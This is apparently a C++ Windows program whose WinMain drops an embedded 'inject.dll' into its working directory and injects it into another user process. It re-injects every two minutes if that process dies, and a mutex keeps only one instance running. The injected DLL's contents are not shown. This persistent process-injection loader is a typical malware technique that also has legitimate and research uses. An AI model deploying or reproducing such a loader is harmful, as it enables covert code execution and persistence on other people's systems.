#include  <direct.h> 
#include"resource.h"
#include"main.h"
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	HANDLE hObject = CreateMutex(NULL, FALSE, "MicroProgram");
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(hObject);
		//MessageBox(NULL, _T("程序已经运行"), _T("信息"), MB_ICONINFORMATION);
		return FALSE;
	}
	DWORD pid = NULL;
	char* fileName = "/inject.dll";
	char filePath[MAX_PATH];
	_getcwd(filePath, MAX_PATH);
	strcat_s(filePath, fileName);
	while (true)
	{
		if ((_access(filePath, 0)) == -1)
		{
			ExportResFile(filePath, IDR_ALL1, "all");
		}
		else
		{
			DWORD dwExitCode = STILL_ACTIVE;
			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
			GetExitCodeProcess(hProcess, &dwExitCode);
			if (STILL_ACTIVE != dwExitCode || hProcess == NULL)
			{
				CloseHandle(hProcess);
			}
			else
			{
				Sleep(120000);
				continue;
			}
		}
		list<DWORD> processes;
		int ret = EnumProcessUserName(processes);
		list<DWORD>::reverse_iterator ir;
		for (ir = processes.rbegin(); ir != processes.rend(); ir++)
		{
			if (InjectDll(filePath, *ir))
			{
				pid = *ir;
				break;
			}
			else
			{
				continue;
			}
		}
	}
	return 1;
}